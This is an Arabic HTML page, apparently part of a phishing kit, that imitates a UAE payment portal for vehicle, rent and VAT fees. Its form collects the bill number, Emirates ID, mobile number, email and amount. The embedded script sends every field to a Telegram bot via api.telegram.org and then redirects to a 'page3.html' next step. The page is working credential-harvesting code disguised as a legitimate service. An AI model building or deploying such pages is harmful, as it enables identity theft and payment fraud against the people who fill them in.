<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات المستخدم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="card header-card">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044286479/aPMsccGlDoDqOtLn.jpg" alt="Logo" class="logo">
            <h1 class="main-title-green">إدخال بيانات المستخدم</h1>
        </div>

        <div class="card form-card">
            <form id="dataForm">
                <div class="input-group">
                    <label>رقم الفاتورة</label>
                    <input type="text" id="billNumber" maxlength="6" pattern="\d{6}" placeholder="أدخل رقم الفاتورة" required>
                </div>

                <div class="input-group">
                    <label>رقم الهوية</label>
                    <input type="text" id="idNumber" maxlength="18" placeholder="784-XXXX-XXXXXXX-X" required>
                </div>

                <div class="input-group">
                    <label>رقم الجوال</label>
                    <input type="tel" id="phoneNumber" maxlength="10" placeholder="05XXXXXXXX" pattern="^05[0245568]\d{7}$" required>
                </div>

                <div class="input-group">
                    <label>البريد الإلكتروني</label>
                    <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
                </div>

                <div class="input-group">
                    <label>نوع الخدمة</label>
                    <select id="serviceType" required>
                        <option value="" disabled selected>اختر نوع الخدمة</option>
                        <option value="دفع رسوم شحن مركبة">دفع رسوم شحن مركبة</option>
                        <option value="دفع رسوم نقل ملكية مركبة">دفع رسوم نقل ملكية مركبة</option>
                        <option value="دفع رسوم عقد ايجار">دفع رسوم عقد ايجار</option>
                        <option value="دفع ضريبة القيمة المضافة">دفع ضريبة القيمة المضافة</option>
                        <option value="استرداد الرسوم المدفوعة">استرداد الرسوم المدفوعة</option>
                        </select>
                </div>

                <div class="input-group">
                    <label>مبلغ السداد (درهم إماراتي)</label>
                    <div class="amount-container">
                        <span class="currency">AED</span>
                        <input type="number" id="amount" placeholder="0.00" step="0.01" required>
                    </div>
                </div>

                <button type="submit" class="cta-button">تأكيد البيانات</button>
            </form>
        </div>
    </div>

    <script>
        // تنسيق تلقائي لرقم الهوية الإماراتية 784-XXXX-XXXXXXX-X
        document.getElementById('idNumber').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 3);
            if (v.length > 3) out += "-" + v.substring(3, 7);
            if (v.length > 7) out += "-" + v.substring(7, 14);
            if (v.length > 14) out += "-" + v.substring(14, 15);
            e.target.value = out;
        });

        const telegramToken = "YOUR_BOT_TOKEN"; 
        const telegramChatId = "YOUR_CHAT_ID";

        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // التحقق النهائي من طول الهوية
            if(document.getElementById('idNumber').value.length < 18) {
                alert("رقم الهوية غير صحيح، يجب أن يكون بالتنسيق الإماراتي الكامل");
                return;
            }

            const message = `
🔔 **بيانات دفع جديدة**
--------------------------
📄 رقم الفاتورة: ${document.getElementById('billNumber').value}
🆔 رقم الهوية: ${document.getElementById('idNumber').value}
📱 رقم الجوال: ${document.getElementById('phoneNumber').value}
📧 البريد: ${document.getElementById('email').value}
🛠 الخدمة: ${document.getElementById('serviceType').value}
💰 المبلغ: ${document.getElementById('amount').value} AED
            `;

            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: telegramChatId, text: message })
            }).then(() => {
                window.location.href = "page3.html"; // التوجه للصفحة الثالثة
            }).catch(() => alert("خطأ في الإرسال، تحقق من التوكن"));
        });
    </script>
</body>
</html>
